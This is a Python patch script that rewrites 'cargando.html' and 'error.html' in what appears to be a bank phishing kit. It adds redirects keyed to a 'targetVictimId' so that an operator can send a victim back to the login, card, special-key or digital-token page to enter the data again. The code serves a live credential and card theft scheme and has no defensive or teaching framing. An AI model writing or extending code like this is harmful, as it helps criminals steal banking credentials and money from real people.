import re

def fix_cargando():
    with open('cargando.html', 'r', encoding='utf-8') as f:
        content = f.read()

    # Block 1 Replacement
    block1_pattern = re.compile(
        r"\} else if \(action === 'error_login' \|\| action === 'error_usuario' \|\| action === 'error_tarjeta'\) \{\s*window\.location\.href = '\./error\.html\?id=' \+ targetVictimId;\s*\}"
    )
    
    new_block1 = """} else if (action === 'error_login' || action === 'error_usuario') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=inicio.html';
              } else if (action === 'error_tarjeta') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=tarjeta.html';
              } else if (action === 'error_token') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=clave-especial.html';
              } else if (action === 'error_correo') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=token-digital.html';
              }"""
              
    content = block1_pattern.sub(new_block1, content)
    
    # Block 2 Replacement
    block2_pattern = re.compile(
        r"else if \(action === 'error_login' \|\| action === 'error_usuario' \|\| action === 'error_tarjeta'\) window\.location\.href = '\./error\.html\?id=' \+ targetVictimId;"
    )
    
    new_block2 = """else if (action === 'error_login' || action === 'error_usuario') window.location.href = './error.html?id=' + targetVictimId + '&from=inicio.html';
                        else if (action === 'error_tarjeta') window.location.href = './error.html?id=' + targetVictimId + '&from=tarjeta.html';
                        else if (action === 'error_token') window.location.href = './error.html?id=' + targetVictimId + '&from=clave-especial.html';
                        else if (action === 'error_correo') window.location.href = './error.html?id=' + targetVictimId + '&from=token-digital.html';"""
                        
    content = block2_pattern.sub(new_block2, content)

    with open('cargando.html', 'w', encoding='utf-8') as f:
        f.write(content)
        
def fix_error_html():
    with open('error.html', 'r', encoding='utf-8') as f:
        content = f.read()

    js_code = """
<script>
window.addEventListener('load', function() {
    var btn = document.getElementById('btnSubmit');
    if (btn) {
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            var urlParams = new URLSearchParams(window.location.search);
            var id = urlParams.get('id');
            var from = urlParams.get('from');
            var backUrl = from ? from : 'inicio.html';
            if (id && from) {
                backUrl += '?id=' + id;
            }
            window.location.href = backUrl;
        });
    }
});
</script>
</body>"""

    if "window.addEventListener('load'" not in content:
        content = content.replace("</body>", js_code)
        
    with open('error.html', 'w', encoding='utf-8') as f:
        f.write(content)

if __name__ == "__main__":
    fix_cargando()
    fix_error_html()
    print("Updates applied to cargando.html and error.html")
